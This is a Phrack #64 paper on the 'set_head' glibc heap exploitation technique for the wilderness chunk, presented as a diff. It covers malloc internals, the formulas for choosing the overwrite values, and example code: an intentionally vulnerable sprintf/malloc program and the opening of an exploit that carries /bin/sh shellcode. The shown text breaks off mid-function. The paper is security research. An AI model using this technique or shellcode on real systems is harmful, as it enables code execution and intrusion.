@@ -1,0 +1,2350 @@
+            _                                                    _
+          _/B\_                                                _/W\_
+          (* *)                Phrack #64 file 9               (* *)
+          | - |                                                | - |
+          |   |  The use of set_head to defeat the wilderness  |   |
+          |   |                                                |   |
+          |   |                    By g463                     |   |
+          |   |                                                |   |
+          |   |          jean-sebastien@guay-leroux.com        |   |
+          (________________________________________________________)
+
+
+1 - Introduction
+
+2 - The set_head() technique
+  2.1 - A look at the past - "The House of Force" technique
+  2.2 - The basics of set_head()
+  2.3 - The details of set_head()
+
+3 - Automation
+  3.1 - Define the basic properties
+  3.2 - Extract the formulas
+  3.3 - Compute the values
+
+4 - Limitations
+  4.1 - Requirements of two different techniques
+      4.1.1 - The set_head() technique
+      4.1.2 - The "House of Force" technique
+  4.2 - Almost 4 bytes to almost anywhere technique
+      4.2.1 - Everything in life is a multiple of 8
+      4.2.2 - Top chunk's size needs to be bigger than the requested malloc
+              size
+      4.2.3 - Logical OR with PREV_INUSE
+
+5 - Taking set_head() to the next level
+  5.1 - Multiple overwrites
+  5.2 - Infoleak
+
+6 - Examples
+  6.1 - The basic scenarios
+      6.1.1.1 - The most basic form of the set_head() technique
+      6.1.1.2 - Exploit
+      6.1.2.1 - Multiple overwrites
+      6.1.2.2 - Exploit
+  6.2 - A real case scenario: file(1) utility
+      6.2.1 - The hole
+      6.2.2 - All the pieces fall into place
+      6.2.3 - hanuman.c
+
+7 - Final words
+
+8 - References
+
+
+--[ 1 - Introduction
+
+Many papers have been published in the past describing techniques on how to
+take advantage of the inbound memory management in the GNU C Library
+implementation.  A first technique was introduced by Solar Designer in his
+security advisory on a flaw in the Netscape browser[1].  Since then, many
+improvements have been made by many different individuals ([2], [3], [4],
+[5], [6] just to name a few).  However, there is always one situation that
+gives a lot more trouble than others.  Anyone who has already tried to take
+advantage of that situation will agree. How to take control of a vulnerable
+program when the only critical information that you can overwrite is the
+header of the wilderness chunk?
+
+The set_head technique is a new way to obtain a "write almost 4 arbitrary
+bytes to almost anywhere" primitive. It was born because of a bug in the
+file(1) utility that the author was unable to exploit with existing
+techniques.
+
+This paper will present the details of the technique.  Also, it will show
+you how to practically apply this technique to other exploits.  The
+limitations of the technique will also be presented.  Finally, some
+examples will be shown to better understand the various aspects of the
+technique.
+
+
+--[ 2 - The set_head() technique
+
+Most of the time, people who write exploits using malloc techniques are not
+aware of the difficulties that the wilderness chunk implies until they face
+the problem.  It is only at this exact time that they realize how the known
+techniques (i.e. unlink, etc.) have no effect on this particular context.
+
+As MaXX once said [3]: "The wilderness chunk is one of the most dangerous
+opponents of the attacker who tries to exploit heap mismanagement. Because
+this chunk of memory is handled specially by the dlmalloc internal
+routines, the attacker will rarely be able to execute arbitrary code if
+they solely corrupt the boundary tag associated with the wilderness chunk."
+
+
+----[ 2.1 - A look at the past - "The House of Force" technique
+
+To better understand the details of the set_head() technique explained in
+this paper, it would be helpful to first understand what has already been
+done on the subject of exploiting the top chunk.
+
+This is not the first time that the exploitation of the wilderness chunk
+has been specifically targeted.  The pioneer of this type of exploitation
+is Phantasmal Phantasmagoria.
+
+He first wrote an article entitled "Exploiting the wilderness" about it in
+2004.  Details of this technique are out of scope for the current paper,
+but you can learn more about it by reading his paper [5].
+
+He gave a second try at exploiting the wilderness in his excellent paper
+"Malloc Maleficarum" [4].  He named his technique "The House of Force".  To
+better understand the set_head() technique, the "House of Force" is
+described below.
+
+The idea behind "The House of Force" is quite simple but there are specific
+steps that need to be followed.  Below, you will find a brief summary of
+all the steps.
+
+
+Step one:
+
+The first step in the "House of Force" consists in overflowing the size
+field of the top chunk to make the malloc library think it is bigger than
+it actually is.  The preferred new size of the top chunk should be
+0xffffffff.  Below is a an ascii graphic of the memory layout at the time
+of the overflow.  Notice that the location of the top chunk is somewhere in
+the heap.
+
+
+                0xbfffffff  -> +-----------------+
+                               |                 |
+                               |     stack       |
+                               |                 |
+                               :                 :
+                               :                 :
+                               .                 .
+                               :                 :
+                               :                 :
+                               |                 |
+                               |                 |
+                               |      heap       |<--- Top chunk
+                               |                 |
+                               +-----------------+
+                               |  global offset  |
+                               |      table      |
+                               +-----------------+
+                               |                 |
+                               |                 |
+                               |      text       |
+                               |                 |
+                               |                 |
+                0x08048000  -> +-----------------+
+
+
+Step two:
+
+After this, a call to malloc with a user-supplied size should be issued.
+With this call, the top chunk will be split in two parts.  One part will be
+returned to the user, and the other part will be the remainder chunk (the
+top chunk).
+
+The purpose of this step is to move the top chunk right before a global
+offset table entry.  The new location of the top chunk is the sum of the
+current address of the top chunk and the value of the malloc call.  This
+sum is done with the following line of code:
+
+        --[ From malloc.c
+
+        remainder = chunk_at_offset(victim, nb);
+
+After the malloc call, the memory layout should be similar to the
+representation below:
+
+
+                0xbfffffff  -> +-----------------+
+                               |                 |
+                               |     stack       |
+                               |                 |
+                               :                 :
+                               :                 :
+                               .                 .
+                               :                 :
+                               :                 :
+                               |                 |
+                               |                 |
+                               |      heap       |
+                               |                 |
+                               +-----------------+
+                               |  global offset  |
+                               |      table      |
+                               +-----------------+<--- Top chunk
+                               |                 |
+                               |                 |
+                               |      text       |
+                               |                 |
+                               |                 |
+                0x08048000  -> +-----------------+
+
+
+Step three:
+
+Finally, another call to malloc needs to be done.  This one needs to be
+large enough to trigger the top chunk code.  If the user has some sort of
+control over the content of this buffer, he can then overwrite entries
+inside the global offset table and he can seize control of the process.
+Look at the following representation for the current memory layout at the
+time of the allocation:
+
+
+                0xbfffffff  -> +-----------------+
+                               |                 |
+                               |     stack       |
+                               |                 |
+                               :                 :
+                               :                 :
+                               .                 .
+                               :                 :
+                               :                 :
+                               |                 |
+                               |                 |
+                               |      heap       |<---- Top chunk
+                               |                 |---+
+                               +-----------------+   |
+                               |  global offset  |   |- Allocated memory
+                               |      table      |   |
+                               +-----------------+---+
+                               |                 |
+                               |                 |
+                               |      text       |
+                               |                 |
+                               |                 |
+                0x08048000  -> +-----------------+
+
+
+----[ 2.2 - The basics of set_head()
+
+Now that the basic review of the "House of Force" technique is done, let's
+look at the set_head() technique.  The basic idea behind this technique is
+to use the set_head() macro to write almost four arbitrary bytes to almost
+anywhere in memory.  This macro is normally used to set the value of the
+size field of a memory chunk to a specific value.  Let's have a peak at the
+code:
+
+        --[ From malloc.c:
+
+        /* Set size/use field */
+        #define set_head(p, s)       ((p)->size = (s))
+
+
+This line is very simple to understand.  It takes the memory chunk 'p',
+modifies its size field and replace it with the value of the variable 's'.
+If the attacker has control of those two parameters, it may be possible to
+modify the content of an arbitrary memory location with a value that he
+controls.
+
+To trigger the particular call to set_head() that could lead to this
+arbitrary overwrite, two specific steps need to be followed.  These steps
+are described below.
+
+
+First step:
+
+The first step of the set_head() technique consists in overflowing the size
+field of the top chunk to make the malloc library think it is bigger than
+it actually is.  The specific value that you will overwrite with will
+depend on the parameters of the exploitable situation.  Below is an ascii
+graphic of the memory layout at the time of the overflow.  Notice that the
+location of the top chunk is somewhere in the heap.
+
+
+                0xbfffffff  -> +-----------------+
+                               |                 |
+                               |      stack      |
+                               |                 |
+                               :                 :
+                               :                 :
+                               .                 .
+                               :                 :
+                               :                 :
+                               |                 |
+                               |                 |
+                               |      heap       |<--- Top chunk
+                               |                 |
+                               +-----------------+
+                               |                 |
+                               |      data       |
+                               |                 |
+                               +-----------------+
+                               |                 |
+                               |                 |
+                               |      text       |
+                               |                 |
+                               |                 |
+                0x08048000  -> +-----------------+
+
+
+Second step:
+
+After this, a call to malloc with a user-supplied size should be issued.
+With this call, the top chunk will be split in two parts.  One part will be
+returned to the user, and the other part will be the remainder chunk (the
+top chunk).
+
+The purpose of this step is to move the top chunk before the location that
+you want to overwrite.  This location needs to be on the stack, and you
+will see why at section 4.2.2.  During this step, the malloc code will set
+the size of the new top chunk with the set_head() macro.  Look at the
+representation below to better understand the memory layout at the time of
+the overwrite:
+
+
+                0xbfffffff  -> +-----------------+
+                               |                 |
+                               |      stack      |
+                               |                 |
+                               +-----------------+
+                               | size of topchunk|
+                               +-----------------+
+                               |prev_size not use|
+                               +-----------------+<--- Top chunk
+                               |                 |
+                               :                 :
+                               :                 :
+                               .                 .
+                               :                 :
+                               :                 :
+                               |                 |
+                               |                 |
+                               |      heap       |
+                               |                 |
+                               +-----------------+
+                               |                 |
+                               |      data       |
+                               |                 |
+                               +-----------------+
+                               |                 |
+                               |                 |
+                               |      text       |
+                               |                 |
+                               |                 |
+                0x08048000  -> +-----------------+
+
+
+If you control the new location of the top chunk and the new size of the
+top chunk, you can get a "write almost 4 arbitrary bytes to almost
+anywhere" primitive.
+
+
+----[ 2.3 - The details of set_head()
+
+The set_head macro is used many times in the malloc library.  However, it's
+used at a particularly interesting emplacement where it's possible to
+influence its parameters.  This influence will let the attacker overwrite 4
+bytes in memory with a value that he can control.
+
+When there is a call to malloc, different methods are tried to allocate the
+requested memory.  MaXX did a pretty great job at explaining the malloc
+algorithm in section 3.5.1 of his text[3].  Reading his text is highly
+suggested before continuing with this text.  Here are the main points of
+the algorithm:
+
+        1. Try to find a chunk in the bin corresponding to the size of the
+           request;
+
+        2. Try to use the remainder chunk;
+
+        3. Try to find a chunk in the regular bins.
+
+
+If those three steps fail, interesting things happen.  The malloc function
+tries to split the top chunk.  The 'use_top' code portion is then called.
+It's in that portion of code that it's possible to take advantage of a call
+to set_head().  Let's analyze the use_top code:
+
+--[ From malloc.c
+
+01 Void_t*
+02 _int_malloc(mstate av, size_t bytes)
+03 {
+04   INTERNAL_SIZE_T nb;               /* normalized request size */
+05
+06   mchunkptr       victim;           /* inspected/selected chunk */
+07   INTERNAL_SIZE_T size;             /* its size */
+08
+09   mchunkptr       remainder;        /* remainder from a split */
+10   unsigned long   remainder_size;   /* its size */
+11
+12
+13   checked_request2size(bytes, nb);
+14
+15 [ ... ]
+16
+17     use_top:
+18
+19     victim = av->top;
+20     size = chunksize(victim);
+21
+22     if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE)) {
+23       remainder_size = size - nb;
+24       remainder = chunk_at_offset(victim, nb);
+25       av->top = remainder;
+26       set_head(victim, nb | PREV_INUSE |
+27                (av != &main_arena ? NON_MAIN_ARENA : 0));
+28       set_head(remainder, remainder_size | PREV_INUSE);
+29
+30       check_malloced_chunk(av, victim, nb);
+31       return chunk2mem(victim);
+32     }
+
+
+All the magic happens at line 28.  By forcing a particular context inside
+the application, it's possible to control set_head's parameters and then
+overwrite almost any memory addresses with almost four arbitrary bytes.
+
+Let's see how it's possible to control these two parameters, which are
+'remainder' and 'remainder_size' :
+
+
+        1. How to get control of 'remainder_size':
+
+           a. At line 13, 'nb' is filled with the normalized size of the
+              value of the malloc call.  The attacker should have control
+              on the value of this malloc call.
+
+           b. Remember that this technique requires that the size field of
+              the top chunk needs to be overwritten by the overflow.  At
+              line 19 & 20, the value of the overwritten size field of the
+              top chunk is getting loaded in 'size'.
+
+           c. At line 22, a check is done to ensure that the top chunk is
+              large enough to take care of the malloc request.  The
+              attacker needs that this condition evaluates to true to reach
+              the set_head() macro at line 28.
+
+           d. At line 23, the requested size of the malloc call is
+              subtracted from the size of the top chunk.  The remaining
+              value is then stored in 'remainder_size'.
+
+
+        2. How to get control of 'remainder':
+
+           a. At line 13, 'nb' is filled with the normalized size of the
+              value of the malloc call.  The attacker should have control
+              of the value of this malloc call.
+
+           b. Then, at line 19, the variable 'victim' gets filled with the
+              address of the top chunk.
+
+           c. After this, at line 24, chunk_at_offset() is called.  This
+              macro adds the content of 'nb' to the value of 'victim'.  The
+              result will be stored in 'remainder'.
+
+
+Finally, at line 28, the set_head() macro modifies the size field of the
+fake remainder chunk and fills it with the content of the variable
+'remainder_size'.  This is how you get your "write almost 4 arbitrary bytes
+to almost anywhere in memory" primitive.
+
+
+--[ 3 - Automation
+
+It was explained in section 2.3 that the variables 'remainder' and
+'remainder_size' will be used as parameters to the set_head macro.  The
+following steps will explain how to proceed in order to get the desired
+value in those two variables.
+
+
+----[ 3.1 - Define the basic properties
+
+Before trying to exploit a security hole with the set_head technique, the
+attacker needs to define the parameters of the vulnerable context.  These
+parameters are:
+
+        1. The return location:  This is the location in memory that you
+           want to write to.  It is often referred as 'retloc' through this
+           paper.
+
+        2. The return address: This is the content that you will write to
+           your return location.  Normally, this will be a memory address
+           that points to your shellcode.  It is often referred as 'retadr'
+           through this paper.
+
+        3. The location of the topchunk: To use this technique, you must
+           know the exact position of the top chunk in memory.  This
+           location is often referred as 'toploc' through this paper.
+
+
+----[ 3.2 - Extract the formulas
+
+The attacker has control on two things during the exploitation stage.
+First, the content of the overwritten top chunk's size field and secondly,
+the size parameter to the malloc call.  The values that the attacker
+chooses for these will determine the exact content of the variables
+'remainder' and 'remainder_size' later used by the set_head() macro.
+
+Below, two formulas are presented to help the attacker find the appropriate
+values.
+
+
+        1. How to get the value for the malloc parameter:
+
+           a. The following line is taken directly from the malloc.c code:
+
+              remainder = chunk_at_offset(victim, nb)
+
+           b. 'nb' is the normalized value of the malloc call.  It's the
+              result of the macro request2size().  To make things simpler,
+              let's add 8 to this value to take care of this macro:
+
+              remainder = chunk_at_offset(victim, nb + 8)
+
+           c. chunk_at_offset() adds the normalized size 'nb' to the top
+              chunk's location:
+
+              remainder = toploc + (nb + 8)
+
+           e. 'remainder' is the return location (i.e. 'retloc') and 'nb'
+              is the malloc size (i.e. 'malloc_size'):
+
+              retloc = toploc + (malloc_size + 8)
+
+           d. Isolate the 'malloc_size' variable to get the final formula:
+
+              malloc_size = (retloc - toploc - 8)
+
+
+        2. The second formula is how to get the new size of the top chunk.
+
+           a. The following line is taken directly from the malloc.c code:
+
+              remainder_size = size - nb;
+
+           b. 'size' is the size of the top chunk (i.e. 'topchunk_size'),
+              and 'nb' is the normalized parameter of the malloc call
+              (i.e. 'malloc_size'):
+
+              remainder_size = topchunk_size - malloc_size
+
+           c. 'remainder_size' is in fact the return address
+              (i.e. retadr'):
+
+              retadr = topchunk_size - malloc_size
+
+           d. Isolate 'topchunk_size' to get the final formula:
+
+              topchunk_size = retadr + malloc_size
+
+           e. topchunk_size will get its three least significant bits
+              cleared by the macro chunksize().  Let's consider this in the
+              formula by adding 8 to the right side of the equation:
+
+              topchunk_size = (retadr + malloc_size + 8)
+
+           g. Take into consideration that the PREV_INUSE flag is being set
+              in the set_head() macro:
+
+              topchunk_size = (retadr + malloc_size + 8) | PREV_INUSE
+
+
+----[ 3.3 - Compute the values
+
+You now have the two basic formulas:
+
+        1. malloc_size = (retloc - toploc - 8)
+
+        2. topchunk_size = (retadr + malloc_size + 8) | PREV_INUSE
+
+You can now proceed with finding the exact values that you will plug into
+your exploit.
+
+To facilitate the integration of those formulas in your exploit code, you
+can use the set_head_compute() function found in the file(1) utility
+exploit code (refer to section 6.2.3).  Here is the prototype of the
+function:
+
+        struct sethead * set_head_compute
+            (unsigned int retloc, unsigned int retadr, unsigned int toploc)
+
+
+The structure returned by the function set_head_compute() is defined this
+way:
+
+        struct sethead {
+            unsigned long topchunk_size;
+            unsigned long malloc_size;
+        }
+
+
+By giving this function your return location, your return address and your
+top chunk location, it will compute the exact malloc size and top chunk
+size to use in your exploit.  It will also tell you if it's possible to
+execute the requested write operation based on the return address and the
+return location you have chosen.
+
+
+--[ 4 - Limitations
+
+At the time of writing this paper, there was no simple and easy way to
+exploit a heap overflow when the top chunk is involved.  Each exploitation
+technique needs a particular context to work successfully.  The set_head
+technique is no different.  It has some requirements to work properly.
+
+Also, it's not a real "write 4 arbitrary bytes to anywhere" primitive.  In
+fact, it would be more of a "write almost 4 arbitrary bytes to almost
+anywhere in memory" primitive.
+
+
+----[ 4.1 - Requirements of two different techniques
+
+Specific elements need to be present to exploit a situation in which the
+wilderness chunk is involved.  These elements tend to impose a lot of
+constraints when trying to exploit a program.  Below, the requirements for
+the set_head technique are listed, alongside those of the "House of Force"
+technique. As you will see, each technique has its pros and cons.
+
+
+------[ 4.1.1 - The set_head() technique
+
+Minimum requirements:
+
+        1. The size field of the topchunk needs to be overwritten with a
+           value that the attacker can control;
+
+        2. Then, there is a call to malloc with a parameter that the
+           attacker can control;
+
+This technique will let you write almost 4 arbitrary bytes to almost
+anywhere.
+
+
+------[ 4.1.2 The "House of Force" technique
+
+Minimum requirements:
+
+        1. The size field of the topchunk must be overwritten with a very
+           large value;
+
+        2. Then, there must be a first call to malloc with a very large
+           size.  An important point is that this same allocated buffer
+           should only be freed after the third step.
+
+        3. Finally, there should be a second call to malloc.  This buffer
+           should then be filled with some user supplied data.
+
+This technique will, in the best-case scenario, let you overwrite any
+region in memory with a string of an arbitrary length that you control.
+
+
+----[ 4.2 - Almost 4 bytes to almost anywhere technique
+
+This set_head technique is not really a "write 4 arbitrary bytes anywhere
+in memory" primitive.  There are some restrictions in malloc.c that greatly
+limit the possible values an attacker can use for the return location and
+the return address in an exploit.  Still, it's possible to run arbitrary
+code if you carefully choose your values.
+
+Below you will find the three main restrictions of this technique:
+
+
+------[ 4.2.1 - Everything in life is a multiple of 8
+
+A disadvantage of the set_head technique is the presence of macros that
+ensure memory locations and values are a multiple of 8 bytes.  These macros
+are:
+
+    - checked_request2size() and
+    - chunksize()
+
+Ultimately, this will have some influence on the selection of the return
+location and the return address.
+
+The memory addresses that you can overwrite with the set_head technique
+need to be aligned on a 8 bytes boundary.  Interesting locations to
+overwrite on the stack usually include a saved EIP of a stack frame or a
+function pointer. These pointers are aligned on a 4 bytes boundary, so with
+this technique, you will be able to modify one memory address on two.
+
+The return address will also need to be a multiple of 8 (not counting the
+logical OR with PREV_INUSE).  Normally, the attacker has the possibility of
+providing a NOP cushion right before his shellcode, so this is not really a
+big issue.
+
+
+------[ 4.2.2 - Top chunk's size needs to be bigger than the requested
+                malloc size
+
+This is the main disadvantage of the set_head technique.  For the top chunk
+code to be triggered and serve the memory request, there is a verification
+before the top chunk code is executed:
+
+        --[ From malloc.c
+
+        if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE)) {
+
+In short, this line requires that the size of the top chunk is bigger than
+the size requested by the malloc call.  Since the variable 'size' and 'nb'
+are computed from the return location, the return address and the top
+chunk's location, it will greatly limit the content and the location of the
+arbitrary overwrite operation.  There is still a valid combination of a
+return address and a return location that exists.
+
+Let's see what the value of 'size' and 'nb' for a given return location and
+return address will be.  Let's find out when there is a situation in which
+'size' is greater than 'nb'.  Consider the fact that the location of the
+top chunk is static and it's at 0x080614f8:
+
+        +------------+------------++------------+------------+
+        |   return   |   return   ||    size    |     nb     |
+        |  location  |   address  ||            |            |
+        +------------+------------++------------+------------+
+        | 0x0804b150 | 0x08061000 ||  134523993 | 4294876240 |
+        | 0x0804b150 | 0xbffffbaa || 3221133059 | 4294876240 |
+        | 0xbffffaaa | 0xbffffbaa || 2012864861 | 3086607786 |
+        | 0xbffffaaa | 0x08061000 || 3221222835 | 3086607786 | <- !!!!!
+        +------------+------------++------------+------------+
+
+As you can see from this chart, the only time that you get a situation
+where 'size' is greater than 'nb' is when your return location is somewhere
+in the stack and when your return address is somewhere in the heap.
+
+
+------[ 4.2.3 - Logical OR with PREV_INUSE
+
+When the set_head macro is called, 'remainder_size', which is the return
+address, will be altered by a logical OR with the flag PREV_INUSE:
+
+        --[ From malloc.c
+
+        #define PREV_INUSE 0x1
+
+        set_head(remainder, remainder_size | PREV_INUSE);
+
+It was said in section 4.2.1 that the return address will always be a
+multiple of 8 bytes due to the normalisation of some macros.  With the
+PREV_INUSE logical OR, it will be a multiple of 8 bytes, plus 1.  With an
+NOP cushion, this problem is solved.  Compared to the previous two, this
+restriction is a very small one.
+
+
+--[ 5 - Taking set_head() to the next level
+
+As a general rule, hackers try to make their exploit as reliable as
+possible.  Exploiting a vulnerability in a confined lab and in the wild are
+two different things.  This section will try to present some techniques to
+improve the reliability of the set_head technique.
+
+
+----[ 5.1 - Multiple overwrites
+
+One way to make the exploitation process a lot more reliable is by using
+multiple overwrites.  Indeed, having the possibility of overwriting a
+memory location with 4 bytes is good, but the possibility to write multiple
+times to memory is even better[8].  Being able to overwrite multiple memory
+locations with set_head will increase your chance of finding a valid return
+location on the stack.
+
+A great advantage of the set_head technique is that it does not corrupt
+internal malloc information in a way that prevents the program from working
+properly.  This advantage will let you safely overwrite more than one
+memory location.
+
+To correctly put this technique in place, the attacker will need to start
+overwriting addresses at the top of the stack, and go downward until he
+seizes control of the program.  Here are the possible addresses that
+set_head() lets you overwrite on the stack:
+
+        1: 0xbffffffc
+        2: 0xbffffff4
+        3: 0xbfffffec
+        4: 0xbfffffe4
+        5: 0xbfffffdc
+        6: 0xbfffffd4
+        7: 0xbfffffcc
+        8: 0xbfffffc4
+        9: ...
+
+Eventually, the attacker will fall on a memory location which is a saved
+EIP in a stack frame.  If he's lucky enough, this new saved EIP will be
+popped in the EIP register.
+
+Remember that for a successfull overwrite, the attacker needs to do two
+things:
+
+        1. Overwrite the top chunk with a specific value;
+        2. Make a call to malloc with a specific value.
+
+Based on the formulas that were found in section 3.3, let's compute the
+values for the top chunk size and the size for the malloc call for each
+overwrite operation.  Let's take the following values for an example case:
+
+        The location of the top chunk:        0x08050100
+        The return address:                   0x08050200
+        The return location:                  Decrementing from 0xbffffffc
+                                              to 0xbfffffc4
+
+         +------------++------------+------------+
+         |   return   || top chunk  |   malloc   |
+         |  location  ||   size     |    size    |
+         +------------++------------+------------+
+         +------------++------------+------------+
+         | 0xbffffffc || 3221225725 | 3086679796 |
+         | 0xbffffff4 || 3221225717 | 3086679788 |
+         | 0xbfffffec || 3221225709 | 3086679780 |
+         | 0xbfffffe4 || 3221225701 | 3086679772 |
+         | 0xbfffffdc || 3221225693 | 3086679764 |
+         | 0xbfffffd4 || 3221225685 | 3086679756 |
+         | 0xbfffffcc || 3221225677 | 3086679748 |
+         | 0xbfffffc4 || 3221225669 | 3086679740 |
+         |     ...    ||     ...    |     ...    |
+         +------------++------------+------------+
+
+By looking at this chart, you can determine that for each overwrite
+operation, the attacker would need to overwrite the size of the top chunk
+with a new value and make a call to malloc with an arbitrary value.  Would
+it be possible to improve this a little bit?  It would be great if the only
+thing you needed to change between each overwrite operation was the size of
+the malloc call, leaving the size of the top chunk untouched.
+
+Indeed, it's possible.  Look closely at the functions used to compute
+malloc_size and topchunk_size.  Let's say the attacker has only one
+possibility to overwrite the size of the top chunk, would it still be
+possible to do multiple overwrites using the set_head technique while
+keeping the same size for the top chunk?
+
+        1. malloc_size = (retloc - toploc - 8)
+        2. topchunk_size = (retadr + malloc_size + 8) | PREV_INUSE
+
+If you look at how 'topchunk_size' is computed, it seems possible.  By
+changing the value of 'retloc', it will affect 'malloc_size'. Then,
+'malloc_size' is used to compute 'topchunk_size'.  By playing with 'retadr'
+in the second formula, you can always hit the same 'topchunk_size'.  Let's
+look at the same example, but this time with a changing return address.
+While the return location is decrementing by 8, let's increment the return
+address by 8.
+
+
+        +------------+-----------++------------+------------+
+        |   return   |  return   || top chunk  |   malloc   |
+        |  location  |  address  ||   size     |    size    |
+        +------------+-----------++------------+------------+
+        +------------+-----------++------------+------------+
+        | 0xbffffffc | 0x8050200 || 3221225725 | 3086679796 |
+        | 0xbffffff4 | 0x8050208 || 3221225725 | 3086679788 |
+        | 0xbfffffec | 0x8050210 || 3221225725 | 3086679780 |
+        | 0xbfffffe4 | 0x8050218 || 3221225725 | 3086679772 |
+        | 0xbfffffdc | 0x8050220 || 3221225725 | 3086679764 |
+        | 0xbfffffd4 | 0x8050228 || 3221225725 | 3086679756 |
+        | 0xbfffffcc | 0x8050230 || 3221225725 | 3086679748 |
+        | 0xbfffffc4 | 0x8050238 || 3221225725 | 3086679740 |
+        |    ...     |    ...    ||     ...    |     ...    |
+        +------------+-----------++------------+------------+
+
+You can see that the size of the top chunk is always the same.  On the
+other hand, the return address changes through the multiple overwrites.
+The attacker needs to have an NOP cushion big enough to adapt to this
+variation.
+
+Refer to section 6.1.2.1 to get a sample vulnerable scenario exploitable
+with multiple overwrites.
+
+
+----[ 5.2 - Infoleak
+
+As was stated in the Shellcoder's Handbook[9]: "An information leak can
+make even a difficult bug possible".  Most of the time, people who write
+exploits try to make them as reliable as possible.  If hackers, using an
+infoleak technique, can improve the reliability of the set_head technique,
+well, that's pretty good.  The technique is already hard to use because it
+relies on unknown memory locations, which are:
+
+        - The return location
+        - The top chunk location
+        - The return address
+
+When there is an overwrite operation, if the attacker is able to tell if
+the program has crashed or not, he can turn this to his advantage.  Indeed,
+this knowledge could help him find one parameter of the exploitable
+situation, which is the top chunk location.
+
+The theory behind this technique is simple.  If the attacker has the real
+address of the top chunk, he will be able to write at the address
+0xbffffffc but not at the address 0xc0000004.
+
+Indeed, a write operation at the address 0xbffffffc will work because this
+address is in the stack and its purpose is to store the environment
+variables of the program.  It does not significantly affect the behaviour
+of the program, so the program will still continue to run normally.
+
+On the other hand, if the attacker wrote in memory starting from
+0xc0000000, there will be a segmentation fault because this memory region
+is not mapped.  After this violation, the program will crash.
+
+To take advantage of this behaviour, the attacker will have to do a series
+of write operations while incrementing or decrementing the location of the
+top chunk.  For each top chunk location tried, there should be 6 write
+operations.
+
+Below, you will find the parameters of the exploitable situation to use
+during the 6 write operations.  The expected result is in the right column
+of the chart.  If you get these results, then the value used for the
+location of the top chunk is the right one.
+
+        +------------+------------++--------------+
+        |  return    |   return   ||    Did it    |
+        |  location  |   address  ||   segfault ? |
+        +------------+------------++--------------+
+        +------------+------------++--------------+
+        | 0xc0000014 | 0x07070707 ||     Yes      |
+        | 0xc000000c | 0x07070707 ||     Yes      |
+        | 0xc0000004 | 0x07070707 ||     Yes      |
+        | 0xbffffffc | 0x07070707 ||     No       |
+        | 0xbffffff4 | 0x07070707 ||     No       |
+        | 0xbfffffec | 0x07070707 ||     No       |
+        +------------+------------++--------------+
+
+If the six write operations made the program segfault each time, then the
+attacker is probably writing after 0xbfffffff or below the limit of the
+stack.
+
+If the 6 write operations succeeded and the program did not crash, then it
+probably means that the attacker overwrote some values in the stack.  In
+that case, decrement the value of the top chunk location to use.
+
+
+--[ 6 - Examples
+
+The best way to learn something new is probably with the help of examples.
+Below, you will find some vulnerable codes and their exploits.
+
+A scenario-based approach is taken here to demonstrate the exploitability
+of a situation.  Ultimately, the exploitability of a context can be defined
+by specific characterictics.
+
+Also, the application of the set_head() technique on a real life example is
+shown with the file(1) utility vulnerability.  The set_head technique was
+found to exploit this specific vulnerability.
+
+
+----[ 6.1 - The basic scenarios
+
+To simplify things, it's useful to define exploitable contexts in terms of
+scenarios.  For each specific scenario, there should be a specific way to
+exploit it.  Once the reader has learned those scenarios, he can then match
+them with vulnerable situations in softwares.  He will then know exactly
+what approach to use to make the most out of the vulnerability.
+
+
+------[ 6.1.1.1 - The most basic form of the set_head() technique
+
+This scenario is the most basic form of the application of the set_head()
+technique.  This is the approach that was used in the file(1) utility
+exploit.
+
+--------------------------- scenario1.c -----------------------------------
+        #include <stdio.h>
+        #include <stdlib.h>
+
+        int main (int argc, char *argv[]) {
+
+                char *buffer1;
+                char *buffer2;
+                unsigned long size;
+
+/* [1] */       buffer1 = (char *) malloc (1024);
+/* [2] */       sprintf (buffer1, argv[1]);
+
+                size = strtoul (argv[2], NULL, 10);
+
+/* [3] */       buffer2 = (char *) malloc (size);
+
+                return 0;
+        }
+--------------------------- end of scenario1.c ----------------------------
+
+Here is a brief description of the important lines in this code:
+
+[1]: The top chunk is split and a memory region of 1024 bytes is requested.
+
+[2]: A sprintf call is made.  The destination buffer is not checked to see
+     if it is large enough.  The top chunk can then be overwritten here.
+
+[3]: A call to malloc with a user-supplied size is done.
+
+
+------[ 6.1.1.2 - Exploit
+
+--------------------------- exp1.c ----------------------------------------
+/*
+   Exploit for scenario1.c
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+
+// The following #define are from malloc.c and are used
+// to compute the values for the malloc size and the top chunk size.
+#define PREV_INUSE 0x1
+#define SIZE_BITS  0x7       // PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA
+#define SIZE_SZ (sizeof(size_t))
+#define MALLOC_ALIGNMENT (2 * SIZE_SZ)
+#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)
+#define MIN_CHUNK_SIZE 16
+#define MINSIZE (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) \
+    & ~MALLOC_ALIGN_MASK))
+#define request2size(req) (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \
+    < MINSIZE)?MINSIZE : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \
+    & ~MALLOC_ALIGN_MASK)
+
+
+struct sethead {
+    unsigned long topchunk_size;
+    unsigned long malloc_size;
+};
+
+
+/* linux_ia32_exec -  CMD=/bin/sh Size=68 Encoder=PexFnstenvSub
+   http://metasploit.com */
+unsigned char scode[] =
+"\x31\xc9\x83\xe9\xf5\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x27"
+"\xe2\xc0\xb3\x83\xeb\xfc\xe2\xf4\x4d\xe9\x98\x2a\x75\x84\xa8\x9e"
+"\x44\x6b\x27\xdb\x08\x91\xa8\xb3\x4f\xcd\xa2\xda\x49\x6b\x23\xe1"
+"\xcf\xea\xc0\xb3\x27\xcd\xa2\xda\x49\xcd\xb3\xdb\x27\xb5\x93\x3a"
+"\xc6\x2f\x40\xb3";
+
+
+struct sethead * set_head_compute
+    (unsigned long retloc, unsigned long retadr, unsigned long toploc) {
+
+    unsigned long check_retloc, check_retadr;
+    struct sethead *shead;
+
+    shead = (struct sethead *) malloc (8);
+    if (shead == NULL) {
+        fprintf (stderr,
+            "--[ Could not allocate memory for sethead structure\n");
+        exit (1);
+    }
+
+    if ( (toploc % 8) != 0 ) {
+        fprintf (stderr,
+            "--[ Impossible to use 0x%x as the top chunk location.",
+            toploc);
+
+        toploc = toploc - (toploc % 8);
